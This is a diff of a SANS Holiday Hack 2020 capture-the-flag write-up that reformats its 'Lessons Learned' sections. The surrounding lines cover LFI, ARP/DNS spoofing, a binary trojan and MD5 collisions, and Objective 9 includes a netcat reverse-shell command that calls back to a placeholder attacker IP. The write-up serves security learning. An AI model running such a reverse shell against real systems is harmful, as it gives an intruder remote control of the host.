@@ -36,10 +36,9 @@ There is a photo of Santa's Desk on that billboard with his personal gift list. 
 - I used the tool suggested in the hint. Took several attempts at twirling and untwirling before I could see what was on the list for him.
 - Once I saw what was on the list, I read it as "poxmark", but had no idea if this was a thing, so I googled it. YUP! A very interesting thing at that. :)
 
+**Lessons Learned**
 
-Lesson Learned |
--------------- |
-Photo obfuscation can actually be 'undone' in some cases.|
+- Photo obfuscation can actually be 'undone' in some cases.
 
 # Objective 2: Investigate S3 Bucket
 
@@ -63,9 +62,9 @@ When you unwrap the over-wrapped file, what text string is inside the package? T
 - Step 8: "cat package.txt"
 
 
-Lessons Learned |
---------------- |
-There may be more public buckets lurking than you realize. And, holy cow, there are lots of ways to compress files!|
+**Lessons Learned** 
+
+- There may be more public buckets lurking than you realize. And, holy cow, there are lots of ways to compress files!
 
 # Objective 3: Point-of-Sale Password Recovery
 
@@ -95,9 +94,9 @@ const SANTA_PASSWORD = 'santapass';
 ~~~
 
 
-Lessons Learned |
---------------- |
-You might think that a password or source code for an application is not available to you, but sometimes it is. You can actually extract files from executables and find interesting artifacts in the process.|
+**Lessons Learned** 
+
+- You might think that a password or source code for an application is not available to you, but sometimes it is. You can actually extract files from executables and find interesting artifacts in the process.
 
 # Objective 4: Operate the Santavator
 
@@ -109,9 +108,9 @@ Got some help from my kid on this one. :)
 
 ![](screenshots/elevator.png)
 
-Lessons Learned |
---------------- |
-Problems involving angles and refraction can often be solved many different ways. If you have kids, consult with them on problems like these. If you want them solved quickly, that is.|
+**Lessons Learned**
+
+- Problems involving angles and refraction can often be solved many different ways. If you have kids, consult with them on problems like these. If you want them solved quickly, that is.
 
 # Objective 5: Open HID Lock
 
@@ -125,11 +124,11 @@ Open the HID lock in the Workshop. Talk to Bushy Evergreen near the talk tracks 
 	- Needed to wait seconds. I was being boneheaded and trying the door before the 10 seconds was up.
 - Step 3: Go through Santa's secret office and become Santa. Amazing! My badge is now the "KringleCon Black Badge"
 
-Lessons Learned |
---------------- |
-When something doesn't work right the first time, think about what information you might be missing. |
-Also help files are very help-ful. Don't overlook them. |
-It really isn't all that hard to simulate badge authentication! |
+**Lessons Learned**
+
+- When something doesn't work right the first time, think about what information you might be missing.
+- Also help files are very help-ful. Don't overlook them.
+- It really isn't all that hard to simulate badge authentication!
 
 # Objective 6: Splunk Challenge
 
@@ -233,10 +232,9 @@ According to x509 certificate events captured by Zeek (formerly Bro), what is th
 - Step 4: Alice says I need to watch Splunk talk.
 	- Passphrase is "Stay Frosty"
 
-Lessons Learned |
---------------- |
-Atomic Red Team tests provide amazing ways to simulate attacks from the Mitre Attack Framework! This is a really good way to test security tools/controls! |
+**Lessons Learned**
 
+- Atomic Red Team tests provide amazing ways to simulate attacks from the Mitre Attack Framework! This is a really good way to test security tools/controls!
 
 # Objective 7: Solve the Sleight's CAN-D-BUS Problem
 
@@ -270,8 +268,8 @@ Jack Frost is somehow inserting malicious messages onto the sleigh's CAN-D bus. 
 
 It works!
 
-Lessons Learned |
---------------- |
+Lessons Learned
+
 Some actions or actuations (like driving a car or sled) might not seem like they are digital in nature, but they are! |
 When looking for troublemakers, it is important to reduce noise as much as possible.|
 
@@ -354,10 +352,10 @@ Here's the result!
 ![](screenshots/tag-generator-env-response.png)
 
 
-Lessons Learned |
---------------- |
-Some responses that don't show up in your browser do show up Burp. |
-Also, don't underestimate what files may be available to you through LFI.|
+**Lessons Learned**
+
+- Some responses that don't show up in your browser do show up Burp. 
+- Also, don't underestimate what files may be available to you through LFI.
 
 
 # Objective 9: ARP Shenanigans
@@ -462,11 +460,11 @@ nc -e /bin/sh [attacking ip] 4444
 - Step 11: Navigate to file contents in question:
 	- "cat *.txt | grep recused" (Looking for the individual who recused themselves from the vote.)
 
-Lessons Learned |
--------------- |
-Learned critical concepts and practical application when it comes to ARP and DNS spoofing. |
-Learned setup for a Linux binary trojan. | 
-Getting that binary to do a callback and give me a shell was aweXome! | 
+**Lessons Learned**
+
+- Learned critical concepts and practical application when it comes to ARP and DNS spoofing.
+- Learned setup for a Linux binary trojan.
+- Getting that binary to do a callback and give me a shell was aweXome!
 
 
 # Objective 10: Defeat Fingerprint Sensor
@@ -481,10 +479,9 @@ This required going into developer mode in Google Chrome. I saw one spot where t
 
 ![](screenshots/remove-besanta-condition.png)
 
-Lessons Learned | 
---------------- |
-It never hurts to take a close look at source code to see what sort of basic logic may be alterable in order to improve the functionality of an elevator or website. :) |
+**Lessons Learned** 
 
+- It never hurts to take a close look at source code to see what sort of basic logic may be alterable in order to improve the functionality of an elevator or website. :)
 
 # Objective 11a: Naughty/Nice List with Blockchain Investigation Part 1 
 
@@ -555,11 +552,11 @@ Here's the final script that retrieves he predicted values:
 
 ~~~
 
-Lessons Learned |
---------------- |
-When it comes to computers, everything is deterministic, including random numbers! Be very careful what assumptions you're making when you're using random numbers to make an application or component more secure! | 
-You can split a 64bit number in half to make a 32bit number!! Additionaly, a deeper understanding of 32bit vs. 64bit helped me explain bits and registers to my 11-year-old. | 
-Finally, I had NO concept of Endianness until Holiday Hack 2020. But now I do! |
+**Lessons Learned**
+
+- When it comes to computers, everything is deterministic, including random numbers! Be very careful what assumptions you're making when you're using random numbers to make an application or component more secure! 
+- You can split a 64bit number in half to make a 32bit number!! Additionaly, a deeper understanding of 32bit vs. 64bit helped me explain bits and registers to my 11-year-old. 
+- I had NO concept of Endianness until Holiday Hack 2020. But now I do!
 
 
 # Objective 11b: Naughty/Nice List with Blockchain Investigation Part 2
@@ -619,13 +616,14 @@ block.
 
 **Bytes changed:**
 
-Byte | Diff | Result |
----- | ---- | ------ |
-30   | -1   | Turn Jack back to "Naughty" |
-D7   | +1   | Keep MD5 hash intact |
+~~~
+Byte | Diff | Result                         |
+---- | ---- | -----------------------------  |
+30   | -1   | Turn Jack back to "Naughty"    |
+D7   | +1   | Keep MD5 hash intact           |
 33   | +1   | Show JF's naughty Wombat abuse |
-1B   | -1   | Keep MD5 hash intact |
-
+1B   | -1   | Keep MD5 hash intact           |
+~~~
 
 ![](screenshots/11b-bytes-changed.png)
 
@@ -663,14 +661,14 @@ full hash sha256: fff054f33c2134e0230efb29dad515064ac97aa8c68d33c58c01213a0d408a
 
 ~~~
 
-Lessons Learned |
---------------- |
-It is important to seek help with solving a problem once you've hit a wall. | 
-MD5 collisions are a thing and they can actually happen, and you can make them happen! | 
-Jack should have just been nice instead of trying to hack the naughty/nice blockchain. | 
-With PDF documents, there is definitely more than what meets the eye. | 
-Make sure you're a hundred percent confident you can recreate current state before you move on to make changes and create a new state that shows some differences and not others. For example, an non-changing MD5 hash and a changing SHA256 hash. | 
-I have a much better sense of how block chains work now as a result of this objective! |
+**Lessons Learned**
+
+- It is important to seek help with solving a problem once you've hit a wall.
+- MD5 collisions are a thing and they can actually happen, and you can make them happen! 
+- Jack should have just been nice instead of trying to hack the naughty/nice blockchain. 
+- With PDF documents, there is definitely more than what meets the eye.
+- Make sure you're a hundred percent confident you can recreate current state before you move on to make changes and create a new state that shows some differences and not others. For example, an non-changing MD5 hash and a changing SHA256 hash. 
+- I have a much better sense of how block chains work now as a result of this objective!
 
 # Narrative
 
